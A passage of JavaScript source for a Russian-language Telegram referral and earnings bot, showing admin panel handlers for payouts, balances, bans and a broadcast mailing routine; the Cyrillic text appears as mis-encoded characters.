   await message.user.inc('outbalance',+reward);
   await User.updateOne({ id: message.chat.id }, {$set: {last_bonus: new Date()}});
    return bot.sendMessage(message.chat.id, `–í—ã –≤—ã–∏–≥—Ä–∞–ª–∏ ${reward} ‚ÇΩ!`);
  }
	if (ADMINS.indexOf(query.from.id) !== -1) {
		if (d == "admin_mm") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏ –∏–ª–∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ:\n\n<i>–î–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –∫–Ω–æ–ø–∫–∏-—Å—Å—ã–ª–∫–∏ –≤ —Ä–∞—Å—Å—ã–ª–∞–µ–º–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–æ–±–∞–≤—å—Ç–µ –≤ –∫–æ–Ω–µ—Ü —Å–æ–æ–±—â–µ–Ω–∏—è —Å—Ç—Ä–æ–∫—É –≤–∏–¥–∞:</i>\n# –¢–µ–∫—Å—Ç –Ω–∞ –∫–Ω–æ–ø–∫–µ # http://t.me/link #', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 7770
		} else if (d == "admin_w") {
			bot.deleteMessage(message.chat.id, message.message_id);
			let tickets = await Ticket.find();
			if (tickets.length == 0) return bot.sendMessage(uid, '–ó–∞—è–≤–æ–∫ –Ω–∞ –≤—ã–≤–æ–¥ –Ω–µ—Ç');
			await tickets.map((x) => {
				bot.sendMessage(uid, `üìù –ò–≥—Ä–æ–∫: <a href="tg://user?id=${x.id}">–ò–≥—Ä–æ–∫</a> (ID: <code>${x.id}</code>)\n
	üí∞ –°—É–º–º–∞: <code>${x.amount}</code>‚ÇΩ
	ü•ù –ö–æ—à–µ–ª—ë–∫: <code>${x.wallet}</code>`, {
					parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: 'üì≠ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –≤—ã–ø–ª–∞—Ç—É', callback_data: `withdraw:${x.id}` }], [{ text: '‚ôªÔ∏è –í–µ—Ä–Ω—É—Ç—å', callback_data: `back:${x.id}` }], [{ text: 'üö´ –ó–∞–±—Ä–∞—Ç—å', callback_data: `take:${x.id}` }]] }
				});
			});
		}
		
		else if (d == "admin_top") {
			bot.deleteMessage(message.chat.id, message.message_id);
			var u = await User.find({ ref: { $ne: 0 }, _id: { $gt: mongo.Types.ObjectId.createFromTime(Date.now() / 1000 - 24 * 60 * 60) } })
			console.log(u)
			var top = []
			u.map((e) => {
				var t = top.filter(u => { if (e.ref == u.id) return true; else return false })
				if (t.length == 0) top.push({ id: e.ref, ref: 1 })
				else {
					top = top.filter(u => { if (e.ref == u.id) return false; else return true })
					top.push({ id: e.ref, ref: t[0].ref + 1 })
				}
			})
			top = top.sort((a, b) => { if (a.ref <= b.ref) return 1; else return -1 })
			top.length = 20
			var str = `<b>üïí –¢–æ–ø –†–µ—Ñ–æ–≤–æ–¥ –∑–∞ 24 —á–∞—Å–∞:</b>\n\n`
			for (const i in top) {
				var us = await User.findOne({ id: top[i].id })
				str += `<b>${Number(i) + 1})</b> <a href="tg://user?id=${us.id}">${us.name ? us.name : "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"}</a> - <b>${top[i].ref}</b> —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤\n`
			}
			bot.sendMessage(uid, str, { reply_markup: { inline_keyboard: [[{ text: "‚óÄÔ∏è –ù–∞–∑–∞–¥", callback_data: "admin_return" }]] }, parse_mode: "HTML" })
		}

		else if (d == "admin_u") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 7772
		}
		else if (d.split("_")[0] == "addOutBal") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ –¥–ª—è –≤—ã–≤–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 7774
			data[uid] = d.split("_")[1]
		}
		else if (d.split("_")[0] == "addPayOuts") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ —Å—É–º–º—É –≤—ã–≤–æ–¥–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 77745555
			data[uid] = d.split("_")[1]
		}
		else if (d.split("_")[0] == "editOutBal") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–π –±–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–≤–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 7776
			data[uid] = d.split("_")[1]
		}
		else if (d.split("_")[0] == "editPayOuts") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—É—é —Å—É–º–º—É –≤—ã–≤–æ–¥–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 77765555
			data[uid] = d.split("_")[1]
		}
		
		else if (d == "admin_mm_stop") {
			var tek = Math.round((mm_i / mm_total) * 40)
			var str = ""
			for (var i = 0; i < tek; i++) str += "+"
			str += '>'
			for (var i = tek + 1; i < 41; i++) str += "-"
			mm_status = false;
			bot.editMessageText("–†–∞—Å—Å—ã–ª–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞!", { chat_id: mm_achatid, message_id: mm_amsgid })
			mm_u = []
		}
		else if (d == "admin_mm_pause") {
			var tek = Math.round((mm_i / mm_total) * 40)
			var str = ""
			for (var i = 0; i < tek; i++) str += "+"
			str += '>'
			for (var i = tek + 1; i < 41; i++) str += "-"
			bot.editMessageText("<b>–í—ã–ø–æ–ª–Ω–µ–Ω–æ:</b> " + mm_i + '/' + mm_total + ' - ' + Math.round((mm_i / mm_total) * 100) + '%\n' + str + "\n\n<b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:</b>\n<b>–£—Å–ø–µ—à–Ω—ã—Ö:</b> " + mm_ok + "\n<b>–ù–µ—É—Å–ø–µ—à–Ω—ã—Ö:</b> " + mm_err, { chat_id: mm_achatid, message_id: mm_amsgid, reply_markup: RM_mm2, parse_mode: html })
			mm_status = false;
		}
		else if (d == "admin_mm_play") {
			mm_status = true;
			bot.editMessageText("–í—ã–ø–æ–ª–Ω–µ–Ω–æ: " + mm_i + '/' + mm_total + ' - ' + Math.round((mm_i / mm_total) * 100) + '%\n', { chat_id: mm_achatid, message_id: mm_amsgid, reply_markup: RM_mm1 })
		}
		else if (d.split("_")[0] == "ban") {
			var uuid = Number(d.split("_")[1])
			await User.findOneAndUpdate({ id: uuid }, { ban: true })
			bot.editMessageText('<a href="tg://user?id=' + uuid + '">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a> –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω!', { chat_id: uid, message_id: message.message_id, parse_mode: html })
		}
		else if (d.split("_")[0] == "unban") {
			var uuid = Number(d.split("_")[1])
			await User.findOneAndUpdate({ id: uuid }, { ban: false })
			bot.editMessageText('<a href="tg://user?id=' + uuid + '">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a> —Ä–∞–∑–±–∞–Ω–µ–Ω!', { chat_id: uid, message_id: message.message_id, parse_mode: html })
		}
		else if (d == "admin_return") {
			bot.deleteMessage(message.chat.id, message.message_id);
			var h = process.uptime() / 3600 ^ 0
			var m = (process.uptime() - h * 3600) / 60 ^ 0
			var s = process.uptime() - h * 3600 - m * 60 ^ 0
			var heap = process.memoryUsage().rss / 1048576 ^ 0
			return bot.sendMessage(uid, '<b>–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å:</b>\n\n<b>–ê–ø—Ç–∞–π–º –±–æ—Ç–∞:</b> ' + h + ' —á–∞—Å–æ–≤ ' + m + ' –º–∏–Ω—É—Ç ' + s + ' —Å–µ–∫—É–Ω–¥\n<b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤ –±–æ—Ç–µ: </b>' + (await User.countDocuments({})) + '\n<b>–ü–∞–º—è—Ç–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ:</b> ' + heap + "–ú–ë\n<b>–ó–∞—è–≤–æ–∫ –Ω–∞ –≤—ã–≤–æ–¥:</b> " + await Ticket.countDocuments(), { parse_mode: "HTML", reply_markup: RM_admin })

		}
	}
});

var state = []


User.prototype.inc = function (field, value = 1) {
	this[field] += value;
	return this.save();
}

User.prototype.dec = function (field, value = 1) {
	this[field] -= value;
	return this.save();
}

User.prototype.set = function (field, value) {
	this[field] = value;
	return this.save();
}

async function mmTick() {
	if (mm_status) {
		try {
			mm_i++
			if (mm_type == "text") {
				if (mm_btn_status)
					bot.sendMessage(mm_u[mm_i - 1], mm_text, { reply_markup: { inline_keyboard: [[{ text: mm_btn_text, url: mm_btn_link }]] }, parse_mode: html }).then((err) => { mm_ok++ }).catch((err) => { mm_err++ })
				else
					bot.sendMessage(mm_u[mm_i - 1], mm_text, { parse_mode: html }).then((err) => { console.log((mm_i - 1) + ') ID ' + mm_u[mm_i - 1] + " OK"); mm_ok++ }).catch((err) => { mm_err++ })
			}
			else if (mm_type == "img") {
				if (mm_btn_status)
					bot.sendPhoto(mm_u[mm_i - 1], mm_imgid, { caption: mm_text, reply_markup: { inline_keyboard: [[{ text: mm_btn_text, url: mm_btn_link }]] } }).then((err) => { mm_ok++ }).catch((err) => { mm_err++ })
				else
					bot.sendPhoto(mm_u[mm_i - 1], mm_imgid, { caption: mm_text }).then((err) => { console.log((mm_i - 1) + ') ID ' + mm_u[mm_i - 1] + " OK"); mm_ok++ }).catch((err) => { mm_err++ })
			}
			if (mm_i % 10 == 0) {
				var tek = Math.round((mm_i / mm_total) * 40)
				var str = ""
				for (var i = 0; i < tek; i++) str += "+"
				str += '>'
				for (var i = tek + 1; i < 41; i++) str += "-"
				bot.editMessageText("<b>–í—ã–ø–æ–ª–Ω–µ–Ω–æ:</b> " + mm_i + '/' + mm_total + ' - ' + Math.round((mm_i / mm_total) * 100) + '%\n' + str + "\n\n<b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:</b>\n<b>–£—Å–ø–µ—à–Ω—ã—Ö:</b> " + mm_ok + "\n<b>–ù–µ—É—Å–ø–µ—à–Ω—ã—Ö:</b> " + mm_err, { chat_id: mm_achatid, message_id: mm_amsgid, reply_markup: RM_mm1, parse_mode: html })
			}
			if (mm_i == mm_total) {
				mm_status = false;
				bot.editMessageText("–í—ã–ø–æ–ª–Ω–µ–Ω–æ: " + mm_i + '/' + mm_total, { chat_id: mm_achatid, message_id: mm_amsgid })
				sendAdmins('<b>–†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!\n\n–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:\n–£—Å–ø–µ—à–Ω–æ:</b> ' + mm_ok + "\n<b>–ù–µ—É—Å–ø–µ—à–Ω–æ:</b> " + mm_err, { parse_mode: html })
				mm_u = []
			}
		} finally { }
	}
}

setInterval(mmTick, 100);

var mm_total
var mm_i
var mm_status = false
var mm_amsgid
var mm_type
var mm_imgid
var mm_text
var mm_achatid
var mm_btn_status
var mm_btn_text
var mm_btn_link
var mm_ok
var mm_err

async function mm_t(text, amsgid, achatid, btn_status, btn_text, btn_link, size) {
	let ut = await User.find({}, { id: 1 }).sort({ _id: -1 })
	mm_total = ut.length
	console.log(ut)
	mm_u = []
	for (var i = 0; i < mm_total; i++)
		mm_u[i] = ut[i].id
	if (size != 100) {
		mm_u = randomizeArr(mm_u)
		mm_total = Math.ceil(mm_total * (size / 100))
		mm_u.length = mm_total
	}
	ut = undefined
	mm_i = 0;
	mm_amsgid = amsgid
	mm_type = "text"
	mm_text = text
	mm_ok = 0
	mm_err = 0
	mm_achatid = achatid
	if (btn_status) {
		mm_btn_status = true
		mm_btn_text = btn_text
		mm_btn_link = btn_link
	}
	else
		mm_btn_status = false
	mm_status = true;
}

bot.on('photo', async msg => {
	if (msg.from != undefined) {
		var uid = msg.from.id
		if (state[uid] == 7770 && ADMINS.indexOf(uid) !== -1) {
			state[uid] = undefined
			var text = ""
			if (msg.caption != undefined) text = msg.caption
			bot.sendMessage(uid, "–†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞!").then((e) => {
				if (text.split("#").length == 4) {
					var btn_text = text.split("#")[1].split("#")[0].replace(/(^\s*)|(\s*)$/g, '')
					var btn_link = text.split("#")[2].split("#")[0].replace(/(^\s*)|(\s*)$/g, '')
					text = text.split("#")[0].replace(/(^\s*)|(\s*)$/g, '').replace(' ', '')
					mm_img(msg.photo[msg.photo.length - 1].file_id, text, e.message_id, e.chat.id, true, btn_text, btn_link, 100)

				}
				else
					mm_img(msg.photo[msg.photo.length - 1].file_id, text, e.message_id, e.chat.id, false, false, false, 100)

			})
		}
	}
})



async function mm_img(img, text, amsgid, achatid, btn_status, btn_text, btn_link, size) {
	let ut = await User.find({}, { id: 1 }).sort({ _id: -1 })
	mm_total = ut.length
	mm_u = []
	for (var i = 0; i < mm_total; i++)
		mm_u[i] = ut[i].id
	if (size != 100) {
		mm_u = randomizeArr(mm_u)
		mm_total = Math.ceil(mm_total * (size / 100))
		mm_u.length = mm_total
	}

	ut = undefined
	mm_i = 0;
	mm_amsgid = amsgid
	mm_type = "img"
	mm_text = text
	mm_imgid = img
	mm_ok = 0
	mm_err = 0
	mm_achatid = achatid
	if (btn_status) {
		mm_btn_status = true
		mm_btn_text = btn_text
		mm_btn_link = btn_link
	}
	else
		mm_btn_status = false
	mm_status = true;
}

function randomizeArr(arr) {
	var j, temp;
	for (var i = arr.length - 1; i > 0; i--) {
		j = Math.floor(Math.random() * (i + 1));
		temp = arr[j];
		arr[j] = arr[i];
		arr[i] = temp;
	}
	return arr;
}

const html = "HTML"

function sendAdmins(text, params) { for (var i = 0; i < ADMINS.length; i++) bot.sendMessage(ADMINS[i], text, params) }

var data = []


function roundPlus(number) { if (isNaN(number)) return false; var m = Math.pow(10, 2); return Math.round(number * m) / m; }


async function ticker() {
	var d = new Date()
	var minutes = d.getMinutes()
	var hours = d.getHours()
	var date = d.getDate()
	if (minutes == 0 && hours == 0 && (date == 5 || date == 15 || date == 25))
		clanWar()
	if (minutes == 0 && hours == 0)
		await User.updateMany({}, { game_limit: 10, spinsToday: 0 })
}

setInterval(ticker, 1000 * 60);
// User.insertMany([
// 	{ "_id" : "5dfaac928d3ea75ef63263ba", "id" : 0, "outbalance": 0,  "wb_profits" : 0, "name" : "Ezafy corp ¬©", "fc" : 0, "ref" : 0., "regDate" : "18/12/2019", "deposit" : 0, "payout" : 0, "fetuses" : 0, "menu" : "{\"price\":20,\"status\":false,\"count\":5,\"bought\":3}", "lastCollect" : 1576709266975, "ban" : false, "refCount" : 0, "ref2Count" : 0, "ref3Count" : 0, "ref4Count" : 0, "ref5Count" : 0, "ref6Count" : 0, "ref7Count" : 0, "ref8Count" : 0, "ref9Count" : 0, "ref10Count" : 0, "not" : false, "__v" : 0, "totalEarn" : 0, "prudLevel" : 0 },
// 	{ "_id" : "5dfbe31493b06e7818e2c5d7", "id" : 1, "menu" : "{\"price\":20,\"status\":true,\"count\":5,\"bought\":3}", "__v" : 0, "totalEarn" : 0, "prudLevel" : 0 }
// ]).then()
